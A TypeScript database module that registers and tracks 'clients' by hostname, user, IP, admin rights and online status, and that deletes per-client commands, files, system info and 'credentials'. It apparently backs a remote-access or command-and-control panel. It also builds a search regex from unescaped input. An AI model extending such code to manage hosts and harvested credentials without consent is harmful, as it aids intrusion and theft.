import { getDatabase } from './db'
import { v4 as uuidv4 } from 'uuid'

export interface Client {
  id: string
  hostname: string
  username: string
  os: string
  ip_address: string
  architecture?: string
  is_admin: boolean
  status: 'online' | 'offline' | 'idle'
  last_seen: string
  first_seen: string
  created_at: string
}

export interface CreateClientInput {
  hostname: string
  username: string
  os: string
  ip_address: string
  architecture?: string
  is_admin?: boolean
}

export async function registerClient(input: CreateClientInput): Promise<Client> {
  const db = await getDatabase()
  const id = uuidv4()
  const now = new Date().toISOString()

  const client: Client = {
    id,
    hostname: input.hostname,
    username: input.username,
    os: input.os,
    ip_address: input.ip_address,
    architecture: input.architecture || 'unknown',
    is_admin: !!input.is_admin,
    status: 'online',
    last_seen: now,
    first_seen: now,
    created_at: now,
  }

  await db.collection('clients').insertOne(client)
  return client
}

export async function getClient(id: string): Promise<Client | null> {
  const db = await getDatabase()
  const row = await db.collection('clients').findOne({ id }) as any
  
  if (!row) return null
  return formatClient(row)
}

export async function getAllClients(): Promise<Client[]> {
  const db = await getDatabase()
  const rows = await db.collection('clients').find().sort({ last_seen: -1 }).toArray() as any[]
  
  return rows.map(formatClient)
}

export async function getOnlineClients(): Promise<Client[]> {
  const db = await getDatabase()
  const rows = await db.collection('clients')
    .find({ status: 'online' })
    .sort({ last_seen: -1 })
    .toArray() as any[]
  
  return rows.map(formatClient)
}

export async function updateClientStatus(id: string, status: 'online' | 'offline' | 'idle'): Promise<Client | null> {
  const db = await getDatabase()
  const now = new Date().toISOString()
  
  await db.collection('clients').updateOne(
    { id },
    { $set: { status, last_seen: now } }
  )
  
  return getClient(id)
}

export async function updateClientLastSeen(id: string): Promise<void> {
  const db = await getDatabase()
  const now = new Date().toISOString()
  
  await db.collection('clients').updateOne(
    { id },
    { $set: { last_seen: now } }
  )
}

export async function deleteClient(id: string): Promise<boolean> {
  const db = await getDatabase()
  
  // Delete related records
  await db.collection('commands').deleteMany({ client_id: id })
  await db.collection('system_info').deleteMany({ client_id: id })
  await db.collection('files').deleteMany({ client_id: id })
  await db.collection('command_history').deleteMany({ client_id: id })
  await db.collection('credentials').deleteMany({ client_id: id })
  
  // Delete the client
  const result = await db.collection('clients').deleteOne({ id })
  return (result.deletedCount ?? 0) > 0
}

export async function searchClients(query: string): Promise<Client[]> {
  const db = await getDatabase()
  const regex = new RegExp(query, 'i')
  
  const rows = await db.collection('clients').find({
    $or: [
      { hostname: regex },
      { username: regex },
      { ip_address: regex },
      { os: regex }
    ]
  }).sort({ last_seen: -1 }).toArray() as any[]
  
  return rows.map(formatClient)
}

export async function getClientStats(): Promise<{
  total: number
  online: number
  offline: number
}> {
  const db = await getDatabase()
  
  const total = await db.collection('clients').countDocuments()
  const online = await db.collection('clients').countDocuments({ status: 'online' })
  const offline = await db.collection('clients').countDocuments({ status: 'offline' })
  
  return { total, online, offline }
}

function formatClient(row: any): Client {
  return {
    id: row.id,
    hostname: row.hostname,
    username: row.username,
    os: row.os,
    ip_address: row.ip_address,
    architecture: row.architecture,
    is_admin: Boolean(row.is_admin),
    status: row.status,
    last_seen: row.last_seen,
    first_seen: row.first_seen,
    created_at: row.created_at,
  }
}
